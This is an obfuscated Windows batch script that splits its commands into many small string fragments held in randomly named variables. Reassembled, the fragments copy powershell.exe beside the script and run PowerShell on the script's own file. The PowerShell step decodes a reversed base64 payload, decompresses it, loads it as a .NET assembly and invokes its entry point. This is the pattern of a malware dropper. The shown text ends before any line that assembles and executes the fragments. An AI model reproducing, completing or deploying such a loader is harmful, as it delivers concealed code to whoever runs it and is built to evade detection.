@echo off
set "tEbVxdoigK=in"
set "iPwUDOHPco=rS"
set "HVCopPXOzI=rs"
set "ChblzTnklm=we"
set "SZirYTJfNG= C"
set "ebVGJPGpOw=we"
set "BEJUPcSSTw=\v"
set "iRhDZtLojG=Wi"
set "TbChfjOYIY=.e"
set "YFoXXcHoDw=st"
set "wMvHKxkXzp=co"
set "XxFugtAFCI= /"
set "TEWlTiUxrY=ws"
set "RoNxlbXQHF=Po"
set "tiOswnkNNo=1."
set "QdyhrcWPER=he"
set "CZjIwbZKyx=\W"
set "INsTUZSkoE=do"
set "pIHdXCJXPL=:\"
set "cbCIARJqCe=ll"
set "GnIwzaSEsE=s\"
set "jQRiSuaUIT=he"
set "eHIuFxDeJR=nd"
set "OfjSZCmHhv=ow"
set "FZMeJsjcrr=32"
set "eCsYPOBqch=y "
set "frmYNEhWsQ=po"
set "fnuXMGKvwB=ll"
set "GtwKayJUUw=xe"
set "hdgNaQZmUE=em"
set "hvVgBHZmyz=Sy"
set "kTLfYqlyhI=py"
set "OMHVuhmOuM=0\"
set "YOSFexZGiS=cd"
set "BhnGcJdASC= %~dp0"
set "BJjZuFtggA=Syst"
set "LdIBApAlUf=rt]:"
set "onzPpVuIiG=rofi"
set "QmWRYusqAG=);$t"
set "SrqNuwYQSd=ach "
set "jzRAQChDoq=;$pc"
set "FLMUBfjxXR=] -j"
set "UsbnimSJZY=-Obj"
set "OlVtyAyMCS=ionM"
set "BUjitHmyFQ=]::N"
set "xilbIkaVXi=-nop"
set "OEjbyyoYfz=pose"
set "OqFZjePWEg=iron"
set "DHSBsElEZO=.Dis"
set "jJctPhrqnY=.Ass"
set "zqWYrlQopw=);$G"
set "ycmrGFNZlU= New"
set "eQbPxnEmnb=embl"
set "CacAXzjuOT=fFAi"
set "bWSDRWxFWA=).Sp"
set "pJiYpGchRK=X.En"
set "YliPGTqvwf=('%~f0'"
set "VblqNNYVSs=m.IO"
set "kjIXthjxTk=morF"
set "TrcXFdJoyr=ateD"
set "cwGfRaiqCf=hy.A"
set "GSDUiiMgRb=oin "
set "BOCfpeCOgT=s75K"
set "vWCCJPJaXX=ddin"
set "yvxSOidffK='txe"
set "PmwdsFExJl=)))"
set "igEbOBpaaU=.Cop"
set "wvCSXNhOaw=]::("
set "PaOGxkVZbT=pStr"
set "NPHvUUMhNK=mKW "
set "OyYEVxJcuL=-joi"
set "xjBtIDOjnL=ck($"
set "BxGSAAkyee=ke($"
set "QaxTnrkMOH=am;$"
set "wuKRBSCcHm=IDmy"
set "TApJMVHhDE=stem"
set "cYoqRuFRQz=cOWS"
set "tXgAaASDhj=Syst"
set "tqlyIRSImD=Invo"
set "qTUbsWzGlt=);$G"
set "KsRKtFyQHC===')"
set "ExIEfLOjNP='0Pg"
set "TmdSEXNawR=ress"
set "YDdobemPPM=();$"
set "OyTVqVeACK=('%*'"
set "aIzvcqqCdn= '')"
set "WAAqnQzWaB=th('"
set "VEMJnmrndG=Star"
set "mQFpzrrvmn=lit("
set "QdInINnzsb=a) {"
set "owHhrVzXWN=j = "
set "WgIochsWgy=.-16"
set "XYMPtJZiBG=tS46"
set "pmfXGYSKBA=..-1"
set "usLEFThwGB=fore"
set "vAyQcrrSVx=gnir"
set "agUpjNSJIG=BC;$"
set "RhwPLXQbcz=c = "
set "IMRjSQuCKd=onve"
set "PlpjmGhfWC=)($v"
set "cZaBAJbhtE=sion"
set "KiJahYKzAd='[-1"
set "nZWtACjPrp=fPdx"
set "vpNvPtMyNo=FbBl"
set "APsfbAXUPL=em.I"
set "shvdanmzdg=vQYq"
set "WccrmTkjmT=();$"
set "cnWOiurfwU=ose("
